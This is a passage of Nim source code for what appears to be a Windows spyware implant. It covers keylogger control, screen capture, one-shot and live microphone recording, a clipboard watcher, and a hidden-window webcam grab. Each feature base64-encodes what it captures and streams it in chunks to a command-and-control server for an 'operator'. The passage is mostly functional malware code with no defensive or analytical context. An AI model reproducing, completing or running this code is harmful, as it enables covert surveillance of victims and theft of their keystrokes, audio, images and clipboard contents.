  # (Nim 2.2.10's Thread has no getThreadId accessor; use the Win32
  # thread id via threadvar inside the proc when needed, or just rely
  # on the unhook + process quit message).
  keylogThreadId = 0

proc stopKeylogger() =
  if not keyloggerRunning: return
  keyloggerRunning = false
  # Post a quit message to unblock GetMessageW. We use PostQuitMessage
  # indirectly by setting readyToQuit via the global — the thread checks
  # it between message pumps. PostThreadMessageW requires the Win32
  # thread id which Nim 2.2.10's Thread type doesn't expose cleanly.
  joinThread(keylogThreadVar)

proc drainKeylogger(): string =
  result = keylogBuffer
  keylogBuffer = ""

# ------------------------------------------------------------
# FEATURES
# ------------------------------------------------------------
proc takeScreenshot(sendToC2: proc(msg: JsonNode): Future[void] {.gcsafe.}
                    ): Future[JsonNode] {.async.} =
  # Captures the primary screen, wraps the BGRA pixels in a proper
  # BITMAPFILEHEADER + BITMAPINFOHEADER so the resulting .bmp opens
  # natively in Paint, Photos, Preview, ChatGPT image upload, etc.
  # Chunks the result via the existing file_chunk protocol and returns
  # a small summary so the operator can see the size in the log.
  try:
    let deskW = GetSystemMetrics(SM_CXSCREEN)
    let deskH = GetSystemMetrics(SM_CYSCREEN)
    if deskW == 0 or deskH == 0:
      return %* {"type": "output", "data": "[!] screen metrics unavailable"}
    let hDesk = GetDesktopWindow()
    let hSrc = GetDC(hDesk)
    if hSrc == 0:
      return %* {"type": "output", "data": "[!] GetDC failed"}
    let hDst = CreateCompatibleDC(hSrc)
    let hBmp = CreateCompatibleBitmap(hSrc, deskW, deskH)
    if hDst == 0 or hBmp == 0:
      discard ReleaseDC(hDesk, hSrc)
      return %* {"type": "output", "data": "[!] alloc failed"}
    let old = SelectObject(hDst, hBmp)
    discard BitBlt(hDst, 0, 0, deskW, deskH, hSrc, 0, 0, SRCCOPY)
    # Pull pixels (BGRA, top-down)
    var info: BITMAPINFO
    info.bmiHeader.biSize = DWORD(sizeof(BITMAPINFOHEADER))
    info.bmiHeader.biWidth = deskW
    info.bmiHeader.biHeight = -deskH  # negative = top-down
    info.bmiHeader.biPlanes = 1
    info.bmiHeader.biBitCount = 32
    info.bmiHeader.biCompression = BI_RGB
    let stride = deskW * 4
    var pixels = newSeq[byte](stride * deskH)
    discard GetDIBits(hDst, hBmp, 0, deskH, addr pixels[0],
                      cast[ptr BITMAPINFO](addr info), DIB_RGB_COLORS)
    SelectObject(hDst, old)
    DeleteObject(hBmp)
    DeleteDC(hDst)
    discard ReleaseDC(hDesk, hSrc)

    # Build a real BMP file:
    #   BITMAPFILEHEADER (14 bytes) + BITMAPINFOHEADER (40 bytes) + pixel data
    let fileHeaderSize = 14
    let infoHeaderSize = 40
    let pixelSize = pixels.len
    let fileSize = fileHeaderSize + infoHeaderSize + pixelSize

    var bmp = newSeqOfCap[byte](fileSize)
    # BITMAPFILEHEADER (all multi-byte fields little-endian)
    bmp.add(0x42); bmp.add(0x4D)  # "BM"
    proc putU32(b: var seq[byte], v: uint32) =
      b.add(byte(v and 0xFF))
      b.add(byte((v shr 8) and 0xFF))
      b.add(byte((v shr 16) and 0xFF))
      b.add(byte((v shr 24) and 0xFF))
    proc putI32(b: var seq[byte], v: int32) =
      b.add(byte(v and 0xFF))
      b.add(byte((v shr 8) and 0xFF))
      b.add(byte((v shr 16) and 0xFF))
      b.add(byte((v shr 24) and 0xFF))
    putU32(bmp, uint32(fileSize))
    bmp.add(0); bmp.add(0)  # reserved
    bmp.add(0); bmp.add(0)  # reserved
    putU32(bmp, uint32(fileHeaderSize + infoHeaderSize))
    # BITMAPINFOHEADER (40 bytes)
    putU32(bmp, uint32(infoHeaderSize))
    putI32(bmp, int32(deskW))
    putI32(bmp, int32(deskH))
    bmp.add(1); bmp.add(0)  # planes = 1
    bmp.add(32); bmp.add(0)  # bit count = 32
    putU32(bmp, uint32(0))  # BI_RGB
    putU32(bmp, uint32(pixelSize))
    for _ in 0..<16: bmp.add(0)  # biXPelsPerMeter, biYPelsPerMeter, biClrUsed, biClrImportant
    # Pixel data
    bmp.add(pixels)

    # Send as file_chunks (send every chunk — fixed v3 bug where the
    # previous version returned after the first chunk).
    let chunkSize = 524288
    let totalChunks = (bmp.len + chunkSize - 1) div chunkSize
    var idx = 0
    var off2 = 0
    while off2 < bmp.len:
      let n = min(chunkSize, bmp.len - off2)
      await sendToC2(%* {
        "type": "file_chunk",
        "filepath": "screenshot.bmp",
        "chunk_index": idx,
        "total_chunks": totalChunks,
        "data": base64.encode(bmp[off2 ..< off2 + n]),
        "last_chunk": off2 + n >= bmp.len
      })
      inc idx
      off2 += n

    return %* {"type": "output",
               "data": "[X7K] screenshot: " & $deskW & "x" & $deskH &
                       " (" & $bmp.len & " bytes, " & $totalChunks & " chunks) -> downloads/screenshot.bmp"}
  except:
    return %* {"type": "output", "data": "[!] screenshot: " & getCurrentExceptionMsg()}

proc buildMicWavHeader(sampleRate, channels, bitsPerSample, pcmLen: int): seq[byte] =
  # 44-byte RIFF/fmt/data header. Shared by captureMic (one-shot)
  # and the live listen header chunk. Bytes are deterministic for
  # any given format, so we can pre-compute and append PCM as it
  # arrives.
  let bytesPerSample = channels * (bitsPerSample div 8)
  let bytesPerSec = sampleRate * bytesPerSample
  proc putU32le(b: var seq[byte], v: int) =
    b.add(byte(v and 0xFF))
    b.add(byte((v shr 8) and 0xFF))
    b.add(byte((v shr 16) and 0xFF))
    b.add(byte((v shr 24) and 0xFF))
  proc putU16le(b: var seq[byte], v: int) =
    b.add(byte(v and 0xFF))
    b.add(byte((v shr 8) and 0xFF))
  proc putTag(b: var seq[byte], tag: string) =
    for ch in tag: b.add(byte(ch))
  result = newSeqOfCap[byte](44)
  putTag(result, "RIFF")
  putU32le(result, 36 + pcmLen)
  putTag(result, "WAVE")
  putTag(result, "fmt ")
  putU32le(result, 16)
  putU16le(result, 1)               # PCM
  putU16le(result, channels)
  putU32le(result, sampleRate)
  putU32le(result, bytesPerSec)
  putU16le(result, bytesPerSample)
  putU16le(result, bitsPerSample)
  putTag(result, "data")
  putU32le(result, pcmLen)

proc captureMic(sendToC2: proc(msg: JsonNode): Future[void] {.gcsafe.},
                seconds: int): Future[JsonNode] {.async.} =
  # Capture N seconds of audio from the default input device (WAVE_MAPPER),
  # wrap it as a proper PCM WAV, and stream the bytes back as file_chunks
  # (same path `screenshot` uses, so the server's download assembler
  # just writes them to downloads/mic_<ts>.wav).
  #
  # Why polling, not a window callback: the agent doesn't pump a message
  # loop on a dedicated thread, and adding one just for capture would
  # add surface and complexity. CALLBACK_NULL + Sleep(20) is plenty
  # for a 250 ms buffer.
  let secs = clamp(seconds, 1, MIC_MAX_SECS)
  let sampleRate    = MIC_SAMPLE_RATE
  let channels      = MIC_CHANNELS
  let bitsPerSample = MIC_BITS
  let bytesPerSample = channels * (bitsPerSample div 8)   # mono 16-bit = 2
  let bytesPerSec    = sampleRate * bytesPerSample
  let pcmSize        = sampleRate * secs * bytesPerSample
  let bufSamples     = (sampleRate * MIC_BUF_MS) div 1000
  let bufSize        = bufSamples * bytesPerSample

  var fmt: WAVEFORMATEX
  fmt.wFormatTag       = WAVE_FORMAT_PCM
  fmt.nChannels        = WORD(channels)
  fmt.nSamplesPerSec   = DWORD(sampleRate)
  fmt.nAvgBytesPerSec  = DWORD(bytesPerSec)
  fmt.nBlockAlign      = WORD(bytesPerSample)
  fmt.wBitsPerSample   = WORD(bitsPerSample)
  fmt.cbSize           = 0

  var hwi: HWAVEIN = 0
  let rc = waveInOpen(addr hwi, WAVE_MAPPER, addr fmt, 0, 0, CALLBACK_NULL)
  if rc != MMSYSERR_NOERROR:
    return %* {"type": "output",
               "data": "[!] mic: waveInOpen failed rc=" & $rc & " (no input device? mic in use?)"}
  if hwi == 0:
    return %* {"type": "output", "data": "[!] mic: waveInOpen returned null handle"}

  var hdrs: array[MIC_BUF_COUNT, WAVEHDR]
  var bufs: array[MIC_BUF_COUNT, seq[byte]]
  var openOk = true

  for i in 0..<MIC_BUF_COUNT:
    bufs[i] = newSeq[byte](bufSize)
    zeroMem(addr hdrs[i], sizeof(WAVEHDR))
    hdrs[i].lpData = cast[LPSTR](addr bufs[i][0])
    hdrs[i].dwBufferLength = DWORD(bufSize)
    hdrs[i].dwBytesRecorded = 0
    hdrs[i].dwUser = 0
    hdrs[i].dwFlags = 0
    hdrs[i].dwLoops = 0
    let rcp = waveInPrepareHeader(hwi, addr hdrs[i], DWORD(sizeof(WAVEHDR)))
    if rcp != MMSYSERR_NOERROR:
      await sendToC2(%* {"type": "output",
                        "data": "[!] mic: waveInPrepareHeader[" & $i & "] rc=" & $rcp})
      openOk = false
      break
    let rca = waveInAddBuffer(hwi, addr hdrs[i], DWORD(sizeof(WAVEHDR)))
    if rca != MMSYSERR_NOERROR:
      await sendToC2(%* {"type": "output",
                        "data": "[!] mic: waveInAddBuffer[" & $i & "] rc=" & $rca})
      openOk = false
      break

  if not openOk:
    for i in 0..<MIC_BUF_COUNT:
      if bufs[i].len > 0:
        discard waveInUnprepareHeader(hwi, addr hdrs[i], DWORD(sizeof(WAVEHDR)))
    discard waveInClose(hwi)
    return %* {"type": "output", "data": "[!] mic: setup failed"}

  let rcStart = waveInStart(hwi)
  if rcStart != MMSYSERR_NOERROR:
    for i in 0..<MIC_BUF_COUNT:
      discard waveInUnprepareHeader(hwi, addr hdrs[i], DWORD(sizeof(WAVEHDR)))
    discard waveInClose(hwi)
    return %* {"type": "output", "data": "[!] mic: waveInStart rc=" & $rcStart}

  var pcm = newSeq[byte](pcmSize)
  var pcmFilled = 0
  var idleTicks = 0
  const MAX_IDLE_TICKS = 50  # ~1s of no buffers = bail

  while pcmFilled < pcmSize:
    var anyDone = false
    for i in 0..<MIC_BUF_COUNT:
      if (hdrs[i].dwFlags and WHDR_DONE) != 0:
        anyDone = true
        let captured = int(hdrs[i].dwBytesRecorded)
        if captured > 0 and pcmFilled < pcmSize:
          let toCopy = min(captured, pcmSize - pcmFilled)
          if toCopy > 0:
            copyMem(addr pcm[pcmFilled], addr bufs[i][0], toCopy)
            pcmFilled += toCopy
        # Re-queue the buffer (or unprepare on completion).
        zeroMem(addr hdrs[i], sizeof(WAVEHDR))
        hdrs[i].lpData = cast[LPSTR](addr bufs[i][0])
        hdrs[i].dwBufferLength = DWORD(bufSize)
        let rca = waveInAddBuffer(hwi, addr hdrs[i], DWORD(sizeof(WAVEHDR)))
        if rca != MMSYSERR_NOERROR:
          await sendToC2(%* {"type": "output",
                            "data": "[!] mic: requeue[" & $i & "] rc=" & $rca})
    if not anyDone:
      inc idleTicks
      if idleTicks > MAX_IDLE_TICKS:
        await sendToC2(%* {"type": "output",
                          "data": "[!] mic: capture stalled after " & $pcmFilled & " bytes"})
        break
    else:
      idleTicks = 0
    if pcmFilled < pcmSize:
      sleep(20)

  discard waveInStop(hwi)
  discard waveInReset(hwi)
  for i in 0..<MIC_BUF_COUNT:
    discard waveInUnprepareHeader(hwi, addr hdrs[i], DWORD(sizeof(WAVEHDR)))
  discard waveInClose(hwi)

  if pcmFilled == 0:
    return %* {"type": "output", "data": "[!] mic: captured 0 bytes"}

  # Trim in case we exited early / overshot.
  if pcmFilled < pcm.len:
    pcm.setLen(pcmFilled)

  # WAV header (44 bytes) + PCM payload.
  var wav = buildMicWavHeader(sampleRate, channels, bitsPerSample, pcm.len)
  for sampleByte in pcm: wav.add(sampleByte)

  let ts = int(getTime().toUnix * 1000) + rand(1000)
  let filename = "mic_" & $ts & ".wav"
  let chunkSize = 524288
  let totalChunks = (wav.len + chunkSize - 1) div chunkSize
  var idx = 0
  var off2 = 0
  while off2 < wav.len:
    let n = min(chunkSize, wav.len - off2)
    await sendToC2(%* {
      "type": "file_chunk",
      "filepath": filename,
      "chunk_index": idx,
      "total_chunks": totalChunks,
      "data": base64.encode(wav[off2 ..< off2 + n]),
      "last_chunk": off2 + n >= wav.len
    })
    inc idx
    off2 += n

  return %* {"type": "output",
             "data": "[" & BuildPrefix & "] mic: " & $secs & "s @ " &
                     $sampleRate & "Hz " & $channels & "ch " &
                     $bitsPerSample & "bit (" & $wav.len & " bytes, " &
                     $totalChunks & " chunks) -> downloads/" & filename}

# ------------------------------------------------------------
# MIC LIVE LISTEN — capture thread + async drain
# ------------------------------------------------------------
proc micListenCaptureThread() {.thread.} =
  # winmm polling loop. Copies captured PCM into micListenRing
  # (raw memory, no GC). Exits when micListenRunning flips to
  # false; the dispatcher joins this thread on unlisten.
  if not micListenFormatKnown:
    micListenStalled = true
    return
  let sampleRate    = int(micListenFormat.nSamplesPerSec)
  let channels      = int(micListenFormat.nChannels)
  let bitsPerSample = int(micListenFormat.wBitsPerSample)
  let bytesPerSample = channels * (bitsPerSample div 8)
  let bufSamples = (sampleRate * MIC_BUF_MS) div 1000
  let bufSize = bufSamples * bytesPerSample
  micListenBufSize = bufSize

  var hwi: HWAVEIN = 0
  let rc = waveInOpen(addr hwi, WAVE_MAPPER, addr micListenFormat, 0, 0, CALLBACK_NULL)
  if rc != MMSYSERR_NOERROR or hwi == 0:
    micListenStalled = true
    return
  micListenHwi = hwi

  for i in 0..<MIC_BUF_COUNT:
    if micListenBufs[i] == nil:
      micListenBufs[i] = cast[ptr UncheckedArray[byte]](alloc(bufSize))
    zeroMem(micListenBufs[i], bufSize)
    zeroMem(addr micListenHdr[i], sizeof(WAVEHDR))
    micListenHdr[i].lpData = cast[LPSTR](micListenBufs[i])
    micListenHdr[i].dwBufferLength = DWORD(bufSize)
    micListenHdr[i].dwBytesRecorded = 0
    micListenHdr[i].dwFlags = 0
    let rcp = waveInPrepareHeader(hwi, addr micListenHdr[i], DWORD(sizeof(WAVEHDR)))
    if rcp != MMSYSERR_NOERROR:
      micListenStalled = true
      discard waveInClose(hwi)
      micListenHwi = 0
      return
    let rca = waveInAddBuffer(hwi, addr micListenHdr[i], DWORD(sizeof(WAVEHDR)))
    if rca != MMSYSERR_NOERROR:
      micListenStalled = true
      discard waveInUnprepareHeader(hwi, addr micListenHdr[i], DWORD(sizeof(WAVEHDR)))
      discard waveInClose(hwi)
      micListenHwi = 0
      return

  let rs = waveInStart(hwi)
  if rs != MMSYSERR_NOERROR:
    for i in 0..<MIC_BUF_COUNT:
      discard waveInUnprepareHeader(hwi, addr micListenHdr[i], DWORD(sizeof(WAVEHDR)))
    discard waveInClose(hwi)
    micListenHwi = 0
    micListenStalled = true
    return

  while micListenRunning:
    var any = false
    for i in 0..<MIC_BUF_COUNT:
      if (micListenHdr[i].dwFlags and WHDR_DONE) != 0:
        any = true
        let captured = int(micListenHdr[i].dwBytesRecorded)
        if captured > 0 and micListenRing != nil:
          # Copy the captured PCM into the ring buffer. If the
          # ring is full, advance tail (drop oldest). Lock holds
          # while we copy, so the drain task sees a consistent
          # snapshot.
          acquire(micListenLock)
          if micListenRingCount + captured > micListenRingCap:
            # Drop enough from the tail to make room.
            let drop = min(micListenRingCount, (micListenRingCount + captured) - micListenRingCap)
            micListenRingTail = (micListenRingTail + drop) mod micListenRingCap
            dec micListenRingCount, drop
          let first = min(captured, micListenRingCap - micListenRingHead)
          copyMem(addr micListenRing[micListenRingHead], micListenBufs[i], first)
          if first < captured:
            copyMem(addr micListenRing[0], addr micListenBufs[i][first], captured - first)
          micListenRingHead = (micListenRingHead + captured) mod micListenRingCap
          inc micListenRingCount, captured
          release(micListenLock)
        # Re-queue the buffer.
        zeroMem(addr micListenHdr[i], sizeof(WAVEHDR))
        micListenHdr[i].lpData = cast[LPSTR](micListenBufs[i])
        micListenHdr[i].dwBufferLength = DWORD(bufSize)
        let rca = waveInAddBuffer(hwi, addr micListenHdr[i], DWORD(sizeof(WAVEHDR)))
        if rca != MMSYSERR_NOERROR:
          micListenStalled = true
    if not any:
      sleep(15)
    else:
      sleep(5)

  # Teardown.
  discard waveInStop(hwi)
  discard waveInReset(hwi)
  for i in 0..<MIC_BUF_COUNT:
    discard waveInUnprepareHeader(hwi, addr micListenHdr[i], DWORD(sizeof(WAVEHDR)))
  discard waveInClose(hwi)
  micListenHwi = 0

proc micListenDrainTask(sendToC2: proc(msg: JsonNode): Future[void] {.gcsafe.}
                        ) {.async, gcsafe.} =
  # Long-running drain. Reads from micListenRing (raw memory) and
  # emits `file_chunk` messages. Exits when micListenRunning flips
  # to false AND the ring is empty.
  while micListenRunning or micListenRingCount > 0:
    # Pull one buffer's worth (or whatever's available) out of the ring.
    var frameLen = 0
    acquire(micListenLock)
    if micListenRingCount > 0 and micListenRing != nil:
      frameLen = min(micListenBufSize, micListenRingCount)
      inc micListenChunkIdx
    release(micListenLock)

    if frameLen > 0:
      # Copy out of the ring (under lock) into a local seq[byte]
      # so we can encode/send without holding the lock.
      var chunk = newSeq[byte](frameLen)
      acquire(micListenLock)
      let first = min(frameLen, micListenRingCap - micListenRingTail)
      copyMem(addr chunk[0], addr micListenRing[micListenRingTail], first)
      if first < frameLen:
        copyMem(addr chunk[first], addr micListenRing[0], frameLen - first)
      micListenRingTail = (micListenRingTail + frameLen) mod micListenRingCap
      dec micListenRingCount, frameLen
      release(micListenLock)

      try:
        let fname = getMicListenFilename()
        await sendToC2(%* {
          "type": "file_chunk",
          "filepath": fname,
          "chunk_index": micListenChunkIdx,
          "total_chunks": MIC_LISTEN_TOTAL_SENTINEL,
          "data": base64.encode(chunk),
          "last_chunk": false
        })
      except:
        micListenRunning = false
        micListenStalled = true
        return
    else:
      if micListenRunning:
        await sleepAsync(20)

# ------------------------------------------------------------
# CLIPBOARD WATCH — capture thread + async drain
# ------------------------------------------------------------
# ISO-like local timestamp for the paste header.
proc padInt(n: int, width: int): string =
  # Zero-padded integer. width=2 → "07", "12"; width=4 → "2026".
  result = $n
  while result.len < width:
    result = "0" & result

proc getLocalTimeStr(): string =
  let t = now()
  result = padInt(int(t.year), 4) & "-" & padInt(int(ord(t.month) + 1), 2) & "-" &
            padInt(int(t.monthday), 2) & " " & padInt(int(t.hour), 2) & ":" &
            padInt(int(t.minute), 2) & ":" & padInt(int(t.second), 2)

# Polling cadence. Sleep is broken into shorter slices so the
# `clipwatchRunning` flag flips to false within ~50ms of the
# operator's `unclipwatch`, not 1500ms later.
proc clipwatchSleepInterruptible(ms: int) =
  # Best-effort responsive sleep. Splits into 50ms slices and
  # checks clipwatchRunning between them. Used by the capture
  # thread so `unclipwatch` is fast.
  var remaining = ms
  while remaining > 0 and clipwatchRunning:
    let slice = min(50, remaining)
    sleep(slice)
    dec remaining, slice

proc clipwatchCaptureThread() {.thread.} =
  # Polls the clipboard at clipwatchIntervalMs. When the text
  # changes, writes the framed record into the ring buffer.
  #
  # Each record in the ring has a small header:
  #   4 bytes:  text length (LE, uint32)
  #   N bytes:  UTF-8 text
  # The drain task reads the length, then N bytes.
  var hwndTryOwner: HWND = 0
  while clipwatchRunning:
    clipwatchSleepInterruptible(clipwatchIntervalMs)
    if not clipwatchRunning: break

    # Try to open the clipboard. Another app may hold it; that's
    # normal (e.g. user is mid-paste). Skip this tick.
    if OpenClipboard(hwndTryOwner) == 0:
      inc clipwatchSkippedContention
      continue

    # Try Unicode text first, fall back to ANSI.
    var captured = false
    var fmtId = 0
    var textPtr: LPSTR = nil
    var textLen = 0
    let hUni = GetClipboardData(CF_UNICODETEXT)
    if hUni != 0:
      let locked = GlobalLock(hUni)
      if locked != nil:
        # Wide string length (in chars, not bytes). Walk till NUL.
        let wstr = cast[ptr UncheckedArray[WCHAR]](locked)
        var wlen = 0
        while wlen < CLIPWATCH_MAX_TEXT_BYTES * 2 and wstr[wlen] != cast[WCHAR](0):
          inc wlen
        # Convert UTF-16 to UTF-8 in-place. Use Windows WideCharToMultiByte.
        let wstrPtr = cast[LPCWCH](wstr)
        let utf8Len = WideCharToMultiByte(CP_UTF8, DWORD(0), wstrPtr, int32(wlen),
                                          nil, 0, nil, nil)
        if utf8Len > 0 and utf8Len <= CLIPWATCH_MAX_TEXT_BYTES:
          # Convert directly into a local buffer, then into ring.
          var utf8buf: array[CLIPWATCH_MAX_TEXT_BYTES + 16, byte]
          let n = WideCharToMultiByte(CP_UTF8, DWORD(0), wstrPtr, int32(wlen),
                                      cast[LPSTR](addr utf8buf[0]),
                                      int32(CLIPWATCH_MAX_TEXT_BYTES), nil, nil)
          if n > 0:
            # Dedupe against last.
            var isDup = false
            if clipwatchLastTextLen == n:
              var same = true
              for j in 0..<n:
                if utf8buf[j] != clipwatchLastText[j]:
                  same = false; break
              isDup = same
            if not isDup and clipwatchRing != nil:
              # Push framed record to ring. Drop if not enough room.
              let recordSize = 4 + n
              acquire(clipwatchLock)
              if clipwatchRingCount + recordSize <= clipwatchRingCap:
                # Write length (LE uint32)
                clipwatchRing[clipwatchRingHead]     = byte(n and 0xFF)
                clipwatchRing[(clipwatchRingHead+1) mod clipwatchRingCap] = byte((n shr 8) and 0xFF)
                clipwatchRing[(clipwatchRingHead+2) mod clipwatchRingCap] = byte((n shr 16) and 0xFF)
                clipwatchRing[(clipwatchRingHead+3) mod clipwatchRingCap] = byte((n shr 24) and 0xFF)
                clipwatchRingHead = (clipwatchRingHead + 4) mod clipwatchRingCap
                # Write bytes
                var j = 0
                while j < n:
                  clipwatchRing[clipwatchRingHead] = utf8buf[j]
                  clipwatchRingHead = (clipwatchRingHead + 1) mod clipwatchRingCap
                  inc j
                inc clipwatchRingCount, recordSize
              release(clipwatchLock)
              if not isDup:
                # Update dedupe buffer.
                for j in 0..<n: clipwatchLastText[j] = utf8buf[j]
                clipwatchLastTextLen = n
                clipwatchLastFormatId = 13  # CF_UNICODETEXT
                inc clipwatchCaptureCount
            captured = true
        discard GlobalUnlock(hUni)
    elif GetClipboardData(CF_TEXT) != 0:
      # ANSI fallback path
      let hAnsi = GetClipboardData(CF_TEXT)
      if hAnsi != 0:
        let locked = GlobalLock(hAnsi)
        if locked != nil:
          let astr = cast[ptr UncheckedArray[cchar]](locked)
          var alen = 0
          while alen < CLIPWATCH_MAX_TEXT_BYTES and astr[alen] != 0.cchar:
            inc alen
          if alen > 0:
            var isDup = false
            if clipwatchLastTextLen == alen:
              var same = true
              for j in 0..<alen:
                if byte(astr[j]) != clipwatchLastText[j]:
                  same = false; break
              isDup = same
            if not isDup and clipwatchRing != nil:
              let recordSize = 4 + alen
              acquire(clipwatchLock)
              if clipwatchRingCount + recordSize <= clipwatchRingCap:
                clipwatchRing[clipwatchRingHead]     = byte(alen and 0xFF)
                clipwatchRing[(clipwatchRingHead+1) mod clipwatchRingCap] = byte((alen shr 8) and 0xFF)
                clipwatchRing[(clipwatchRingHead+2) mod clipwatchRingCap] = byte((alen shr 16) and 0xFF)
                clipwatchRing[(clipwatchRingHead+3) mod clipwatchRingCap] = byte((alen shr 24) and 0xFF)
                clipwatchRingHead = (clipwatchRingHead + 4) mod clipwatchRingCap
                var j = 0
                while j < alen:
                  clipwatchRing[clipwatchRingHead] = byte(astr[j])
                  clipwatchRingHead = (clipwatchRingHead + 1) mod clipwatchRingCap
                  inc j
                inc clipwatchRingCount, recordSize
              release(clipwatchLock)
              if not isDup:
                for j in 0..<alen: clipwatchLastText[j] = byte(astr[j])
                clipwatchLastTextLen = alen
                clipwatchLastFormatId = 1  # CF_TEXT
                inc clipwatchCaptureCount
            captured = true
          discard GlobalUnlock(hAnsi)
    else:
      # No text on the clipboard. If the last capture was text and
      # the clipboard now has any format, log a format change so
      # the operator sees non-text activity. Cheap, just one
      # push when state changes.
      if clipwatchLastFormatId != 0 and clipwatchRing != nil:
        # Don't pollute the ring; the operator can ask via `clip` if
        # they want a snapshot. The dedupe-on-text-change covers
        # the common case (text → text = no event).
        discard
    discard captured
    discard fmtId
    discard textPtr
    discard textLen
    CloseClipboard()

proc clipwatchDrainTask(sendToC2: proc(msg: JsonNode): Future[void] {.gcsafe.}
                        ) {.async, gcsafe.} =
  # Reads framed records from clipwatchRing and ships each one as
  # a single file_chunk to the server (one file per paste).
  # Stops when the thread is no longer running AND the ring is empty.
  while clipwatchRunning or clipwatchRingCount > 0:
    var recordLen = 0
    acquire(clipwatchLock)
    if clipwatchRingCount >= 4 and clipwatchRing != nil:
      recordLen = int(clipwatchRing[clipwatchRingTail]) or
                  (int(clipwatchRing[(clipwatchRingTail+1) mod clipwatchRingCap]) shl 8) or
                  (int(clipwatchRing[(clipwatchRingTail+2) mod clipwatchRingCap]) shl 16) or
                  (int(clipwatchRing[(clipwatchRingTail+3) mod clipwatchRingCap]) shl 24)
      # Sanity: drop the record if length is unreasonable.
      if recordLen < 0 or recordLen > CLIPWATCH_MAX_TEXT_BYTES:
        recordLen = 0
    release(clipwatchLock)

    if recordLen > 0 and clipwatchRingCount >= 4 + recordLen:
      # Read out the record under lock.
      var text = newSeq[byte](recordLen)
      acquire(clipwatchLock)
      clipwatchRingTail = (clipwatchRingTail + 4) mod clipwatchRingCap
      var j = 0
      while j < recordLen:
        text[j] = clipwatchRing[clipwatchRingTail]
        clipwatchRingTail = (clipwatchRingTail + 1) mod clipwatchRingCap
        inc j
      dec clipwatchRingCount, 4 + recordLen
      release(clipwatchLock)

      # Frame as: "<ISO timestamp>\n<text>\n---\n"
      var framed = newStringOfCap(40 + recordLen + 8)
      framed.add(getLocalTimeStr() & "\n")
      for k in 0..<recordLen:
        framed.add(chr(text[k]))
      framed.add("\n---\n")
      let framedBytes = cast[seq[byte]](framed)

      inc clipwatchChunkIdx
      let ts = int(getTime().toUnix * 1000) + rand(1000)
      let filename = "clip_" & $ts & "_" & $clipwatchChunkIdx & ".txt"
      let chunkSize = 524288
      let totalChunks = (framedBytes.len + chunkSize - 1) div chunkSize
      var idx = 0
      var off2 = 0
      while off2 < framedBytes.len:
        let n = min(chunkSize, framedBytes.len - off2)
        try:
          await sendToC2(%* {
            "type": "file_chunk",
            "filepath": filename,
            "chunk_index": idx,
            "total_chunks": totalChunks,
            "data": base64.encode(framedBytes[off2 ..< off2 + n]),
            "last_chunk": off2 + n >= framedBytes.len
          })
        except:
          # Connection gone — stop the drain. The capture thread
          # will keep trying until the operator sends unclipwatch.
          clipwatchRunning = false
          clipwatchStalled = true
          return
        inc idx
        off2 += n
    else:
      if recordLen > 0:
        # Partial record in the ring — wait for the rest.
        await sleepAsync(20)
      elif clipwatchRunning:
        await sleepAsync(30)

# ------------------------------------------------------------
# WEBCAM CAPTURE  (operator -> cam <id> [device])
# ------------------------------------------------------------
# Video-for-Windows single-shot capture. Steps:
#   1. capCreateCaptureWindowA — hidden top-level window
#   2. WM_CAP_DRIVER_CONNECT   — attach to cam `device`
#   3. WM_CAP_GRAB_FRAME       — snap one frame
#   4. WM_CAP_EDIT_COPY        — copy the DIB to the clipboard
#   5. GetClipboardData(CF_DIB)— pull the raw DIB out
#   6. Prepend BITMAPFILEHEADER → ship as file_chunk to the C2
#
# Why VfW and not DirectShow / Media Foundation: VfW is built into
# Windows, no extra dep, no COM. The downside is it needs a window
# in the user's session, which is true for a desktop agent anyway.
proc captureCam(sendToC2: proc(msg: JsonNode): Future[void] {.gcsafe.},
                device: int): Future[JsonNode] {.async.} =
  # VfW message codes.
  const
    WM_CAP                       = WM_USER
    WM_CAP_DRIVER_CONNECT        = WM_CAP + 10
    WM_CAP_DRIVER_DISCONNECT     = WM_CAP + 11
    WM_CAP_EDIT_COPY             = WM_CAP + 30
    WM_CAP_GRAB_FRAME            = WM_CAP + 60
  const
    DEVICE_MAX = 9
  let devIdx = clamp(device, 0, DEVICE_MAX)

  # Hidden window for the capture pipeline. VfW requires a HWND
  # to attach the driver to — even though we never display the
  # preview, the window has to exist.
  let hwnd = capCreateCaptureWindowA("cam", WS_OVERLAPPEDWINDOW,
                                     0, 0, 320, 240, 0, 0)
  if hwnd == 0:
    return %* {"type": "output",
               "data": "[!] cam: capCreateCaptureWindowA failed"}

  var connected = false
  try:
    let con = SendMessageA(hwnd, WM_CAP_DRIVER_CONNECT, WPARAM(devIdx), 0)
    if con == 0:
      return %* {"type": "output",
                 "data": "[!] cam: no camera at device " & $devIdx &
                         " (no webcam? in use by another app?)"}
    connected = true

    # Snap one frame. WM_CAP_GRAB_FRAME is synchronous and updates
    # the internal frame buffer.
    discard SendMessageA(hwnd, WM_CAP_GRAB_FRAME, 0, 0)

    # Copy the DIB to the clipboard. WM_CAP_EDIT_COPY is the only
    # documented way to get the DIB out of VfW without writing to
    # disk first.
    let ed = SendMessageA(hwnd, WM_CAP_EDIT_COPY, 0, 0)
    if ed == 0:
      return %* {"type": "output",
                 "data": "[!] cam: WM_CAP_EDIT_COPY failed"}

    if OpenClipboard(0) == 0:
      return %* {"type": "output",
                 "data": "[!] cam: OpenClipboard failed"}
    let got = false
    try:
      let hDib = GetClipboardData(CF_DIB)
      if hDib == 0:
        return %* {"type": "output",
                   "data": "[!] cam: no DIB in clipboard"}

      # Read the BITMAPINFOHEADER to get the DIB size.
      var bmi: BITMAPINFOHEADER
      copyMem(addr bmi, cast[ptr byte](hDib), sizeof(BITMAPINFOHEADER))
      let w = int(bmi.biWidth)
      let h = int(abs(bmi.biHeight))
      if w == 0 or h == 0:
        return %* {"type": "output",
                   "data": "[!] cam: driver returned empty frame (biWidth=" &
                           $w & " biHeight=" & $h & ")"}
      # biSizeImage is the pixel data size; fall back to the
      # standard 32-bpp stride × height if the driver left it 0.
      var pixelBytes = int(bmi.biSizeImage)
      if pixelBytes == 0:
        let bpp = int(bmi.biBitCount)
        if bpp == 0:
          return %* {"type": "output",
                     "data": "[!] cam: driver returned bpp=0"}
        pixelBytes = ((w * bpp + 31) div 32) * 4 * h
      let dibSize = sizeof(BITMAPINFOHEADER) + pixelBytes
      # Some drivers stuff extra color masks/palette data into the
      # DIB after the header (BI_BITFIELDS = 12 bytes for 16/32bpp).
      # If biClrUsed > 0 there's a palette; if biCompression is
      # BI_BITFIELDS the 3 DWORD masks come right after the header.
      let compression = int(bmi.biCompression)
      let extraHdr = if compression == 3: 12 else: 0
